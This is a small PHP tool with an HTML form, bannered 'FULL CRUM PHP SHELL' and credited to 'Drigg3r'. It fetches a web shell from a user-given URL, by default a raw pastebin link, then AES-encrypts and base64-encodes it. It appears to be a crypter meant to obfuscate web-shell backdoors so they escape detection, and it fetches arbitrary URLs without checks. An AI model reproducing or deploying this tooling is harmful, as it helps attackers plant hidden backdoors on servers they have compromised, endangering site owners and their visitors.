<html>
<body>

<form method=POST action="">
  Your Shell Location:<br>
  <input type="text" name="SHELL" value="http://pastebin.com/raw/yourlocation">
<br>
  Key:<br>
  <input type="text" name="key" value="YourKey">
<br>
  IV:<br>
  <input type="text" name="iv" value="YourIV">
<br>
  <input type="submit" value="Submit">
</form> 

</body>
</html>
<?php
/*

_______ _     _        _______  ______ _     _ _______       _____  _     _  _____       _______ _     _ _______
|______ |     | |      |       |_____/ |     | |  |  |      |_____] |_____| |_____]      |______ |_____| |______ |      |
|       |_____| |_____ |_____  |    \_ |_____| |  |  |      |       |     | |            ______| |     | |______ |_____ |_____

                                                    By Drigg3r

*/
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    }
    else if( $action == 'decrypt' ){
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

$shell = $_POST['SHELL'];
$key = $_POST['key'];
$iv = $_POST['iv'];

if (isset($_POST['SHELL'])){
$decrypt_txt = file_get_contents($shell); 
$encrypt_txt = encrypt_decrypt('encrypt', $decrypt_txt, $key, $iv);

echo "$encrypt_txt";
}
?>

